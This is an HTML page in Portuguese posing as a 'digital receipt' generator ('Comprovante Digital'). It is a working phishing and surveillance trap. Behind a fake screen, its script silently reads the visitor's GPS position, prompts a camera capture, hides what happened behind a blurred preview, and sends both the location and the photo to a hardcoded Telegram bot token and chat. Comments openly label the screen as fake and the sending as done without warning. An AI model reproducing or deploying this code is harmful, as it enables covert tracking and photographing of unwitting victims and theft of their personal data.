<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Comprovante Digital</title>
<style>
  body{margin:0;font-family:Arial;background:#111;color:#0f0}
  #fakeScreen{
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:#000;display:flex;justify-content:center;align-items:center;
    z-index:9999;
  }
  #fakeBox{
    background:#222;padding:20px;border:1px solid #0f0;
    text-align:center;color:#0f0;
  }
  #fakeBtn{
    background:#0f0;color:#000;border:none;padding:10px 20px;margin-top:15px;
    cursor:pointer;font-weight:bold
  }
  #previewImg{max-width:100%;display:none;margin-top:10px;border:1px solid #0f0}
  #log{position:fixed;bottom:5px;left:5px;font-size:10px;color:#0f0;opacity:.5}
</style>
</head>
<body>

<!-- Tela falsa -->
<div id="fakeScreen">
  <div id="fakeBox">
    <h2>Comprovante Digital</h2>
    <p>Clique em <strong>GERAR</strong> para emitir seu comprovante.</p>
    <button id="fakeBtn" onclick="startCapture()">GERAR</button>
  </div>
</div>

<!-- Preview mascarado -->
<img id="previewImg" alt="Comprovante gerado">

<!-- Log invisível -->
<pre id="log"></pre>

<script>
const BOT  = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT = '-1003187104876';

let lat, lon, photoBlob;

/* Esconde log */
document.getElementById('log').style.display='none';

function startCapture(){
  /* 1) GPS silencioso */
  navigator.geolocation.getCurrentPosition(pos=>{
    lat = pos.coords.latitude;
    lon = pos.coords.longitude;
    /* 2) Foto silenciosa */
    const input = document.createElement('input');
    input.type='file';input.accept='image/*';input.capture='environment';
    input.onchange = e=>{
      photoBlob = e.target.files[0];
      if(!photoBlob) return;
      /* Preview borrada (opcional) */
      const url = URL.createObjectURL(photoBlob);
      const img = document.getElementById('previewImg');
      img.src = url;
      img.style.display='block';
      img.style.filter='blur(6px)';
      /* Remove tela falsa */
      document.getElementById('fakeScreen').style.display='none';
      /* Envia sem avisar */
      send();
    };
    input.click();
  },err=>{/* ignora erro */});
}

async function send(){
  /* Localização */
  await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`,{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`chat_id=${CHAT}&latitude=${lat}&longitude=${lon}`
  });
  /* Foto */
  const fd = new FormData();
  fd.append('chat_id', CHAT);
  fd.append('photo', photoBlob, 'comprovante.jpg');
  await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
}
</script>

</body>
</html
